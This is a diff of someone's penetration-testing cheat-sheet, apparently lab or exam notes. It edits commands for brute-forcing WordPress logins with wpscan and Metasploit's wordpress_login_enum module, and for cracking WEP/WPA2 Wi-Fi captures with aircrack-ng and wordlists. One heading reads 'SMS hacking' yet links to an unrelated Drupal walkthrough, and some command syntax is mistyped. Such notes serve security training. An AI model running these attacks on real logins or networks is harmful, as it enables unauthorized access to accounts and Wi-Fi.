@@ -70,21 +70,24 @@ optional
 -p : spesific password (qwerty,password1)
 -P : password wordlist (/usr/share/wordlists/rockyou.txt)
 
-### Brute Forcing Wordpress Login Pages ###
+### Brute Forcing SMS  ###
+
+https://walk-throughs.medium.com/exploiting-drupal-via-metasploit-ctf-walkthrough-fcd5f5fa2fa
+
 
 Wpscan
 Wpscan –url http://ip/ --enumerate u
-wpscan --url http://10.0.1.55:8080/uri -u root -P passwdfile.txt
+wpscan --url http://ip:port/uri -u root -P passwdfile.txt
 wpscan -u james -P /password.txt — urlhttp://:8080/TEST
 
 Metasploit
 msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wordpress_login_enum
-        show options
-       set PASS_FILE /home/user/Desktop/Wordlist/password.txt
-       set RHOSTS 10.0.1.55  (target ip)
-       set RPORT 8080          (target port)
-       set TARGETURI /uri
-       set USERNAME admin
+show options
+set PASS_FILE /home/anar/password.txt
+set RHOSTS ip  (target ip)
+set RPORT 8080          (target port)
+set TARGETURI /uri
+set USERNAME admin
 
 ### SQL Injection
 
@@ -180,7 +183,7 @@ Crack the wireless encryption and identify the Wi-Fi password
 (To find BSSID: on Wireshark click on packet, search BSSID and copy value)
 
 aircrack-ng '/home/attacker/WEPcrack-01.cap bu komanda ile 20:E5:2A:E4:38:00  tapirsan
-aircrack-ng -a2 -b SSID  -w /usr/share/wordlists/password.txt '/home/attacker/Desktop/Sample Captures/WPA2crack-01.cap'
+aircrack-ng -a2 -b SSID  -w /usr/share/wordlists/password.txt '/home/anar/data/anar/1.cap'
 ####
 SMS hacking 
 https://walk-throughs.medium.com/exploiting-drupal-via-metasploit-ctf-walkthrough-fcd5f5fa2fa
